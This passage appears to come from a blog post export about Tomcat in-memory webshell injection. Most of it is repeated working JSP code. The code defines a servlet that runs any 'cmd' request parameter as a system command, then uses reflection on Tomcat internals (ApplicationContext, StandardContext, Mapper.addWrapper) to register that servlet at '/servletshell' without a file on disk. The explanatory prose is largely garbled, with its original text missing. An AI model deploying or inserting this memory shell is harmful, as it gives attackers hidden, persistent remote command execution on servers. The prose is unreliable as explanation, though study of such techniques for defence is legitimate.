state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n\n\n addservletpoc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n      //wrapper\n    Servletshell shell=new Servletshell()\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n%>\n```\n\n\n\n## \n\nservlet\n\n","slug":"Tomcatservlet","published":1,"updated":"2024-04-17T08:43:00.803Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7iz000ih7761ypi4rf4","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>servletservletservlet</p>\n<p></p>\n<p><code>DefaultInstanceManager#newInstance</code>  <code>clazz</code> </p>\n<p> <code>clazz</code>  <code>StandardWrapper.servletClass</code> <code>StandardWrapperValve</code>  <code>context</code>  <code>StandardContext</code>  <code>children</code> </p>\n<p>wrapperservletservlet <code>StandardContext</code>  <code>addServlet</code> </p>\n<p><code>ApplicationContext</code> </p>\n<p> <code>createWrapper</code>  <code>servlet</code>  <code>addChild</code>  <code>children</code> servletdemo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.Writer&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Servletshell</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doGet</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.<span class=\"title function_ invoke__\">getParameter</span>(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(cmd!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.<span class=\"title function_ invoke__\">getRuntime</span>().<span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;cmd /c &quot;</span>+cmd).<span class=\"title function_ invoke__\">getInputStream</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>();</span><br><span class=\"line\">                byte[] b = <span class=\"keyword\">new</span> byte[<span class=\"number\">1024</span>];</span><br><span class=\"line\">                <span class=\"keyword\">int</span> a = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((a = in.<span class=\"title function_ invoke__\">read</span>(b)) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    baos.<span class=\"title function_ invoke__\">write</span>(b, <span class=\"number\">0</span>, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.<span class=\"title function_ invoke__\">getWriter</span>();</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">write</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(baos.<span class=\"title function_ invoke__\">toByteArray</span>()));</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">flush</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doPost</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.<span class=\"title function_ invoke__\">doPost</span>(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//context</span></span><br><span class=\"line\">    ServletContext servletContext = request.<span class=\"title function_ invoke__\">getSession</span>().<span class=\"title function_ invoke__\">getServletContext</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    appctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class=\"title function_ invoke__\">get</span>(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    stdctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.<span class=\"title function_ invoke__\">get</span>(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    Field state=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;state&quot;</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">set</span>(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    String servletName=<span class=\"string\">&quot;servletShell&quot;</span>;</span><br><span class=\"line\">    String servletClass=<span class=\"string\">&quot;servletShell.class&quot;</span>;</span><br><span class=\"line\">    Class serletC=Servletshell.<span class=\"keyword\">class</span>;</span><br><span class=\"line\">    Method addServlet=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredMethod</span>(<span class=\"string\">&quot;addServlet&quot;</span>, String.<span class=\"keyword\">class</span>, Class.<span class=\"keyword\">class</span>);</span><br><span class=\"line\">    <span class=\"comment\">//addServlet.setAccessible(true);</span></span><br><span class=\"line\">    addServlet.<span class=\"title function_ invoke__\">invoke</span>(applicationContext,servletName,serletC);</span><br><span class=\"line\">    System.out.<span class=\"title function_ invoke__\">println</span>(standardContext.<span class=\"title function_ invoke__\">findChildren</span>());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>servlet <code>children</code> </p>\n<p> <code>servlet-name</code></p>\n<p> <code>addServletMapping</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;servletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.println(standardContext.findChildren());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>503503</p>\n<p>sb</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>404</p>\n<p> <code>ApplicationFilterChain#</code>`internalDoFilter <code></code> servlet <code></code> service` </p>\n<p> <code>DefaultServlet</code>  <code>ServletShell</code> servletservlet <code>setServlet</code> </p>\n<p><code>ApplicationFilterFactor#createFilterChain</code></p>\n<p><code>StandardWrapperValv#invoke</code></p>\n<p>servlet <code>wrapper.allocate</code> </p>\n<p> <code>instance</code>  <code>instance</code>  <code>wrapper</code> </p>\n<p> <code>getContainer</code></p>\n<p> <code>setContainer</code> <code>StandardContextValve#invoke</code></p>\n<p>wrapper <code>wrapper</code> <code>request</code> <code>request</code> <code>org.apache.catalina.connector.CoyoteAdapter#service</code></p>\n<p> <code>request</code> <code>postParseRequest</code> </p>\n<p></p>\n<p>map</p>\n<p><code>org.apache.catalina.mappe.Mapper#internalMap</code> <code>contextVersion</code></p>\n<p> <code>contextVersion</code> <code>exactWrappers</code> servlet <code>wrapper</code> servlet404servletwrapperwrapper <code>addWrapper</code> </p>\n<p> <code>contextVersion</code>  <code>wrapper</code></p>\n<p>   <code>contextVersion</code></p>\n<p></p>\n<p> <code>contextObjectToContextVersionMap</code></p>\n<p> <code>contextVersion</code>  <code>contextVersion</code>,<code>contextObjectToContextVersionMap</code> mappermapper</p>\n<p>service <code>getMapper</code>  <code>mapper</code>  <code>StandardService</code> </p>\n<p> <code>ApplicationContext</code>  <code>service</code>  <code>ApplicationContext</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>   <code>wrapper</code></p>\n<p> <code>StandardContext</code> <code>createWrapper</code>  <code>wrapper</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field 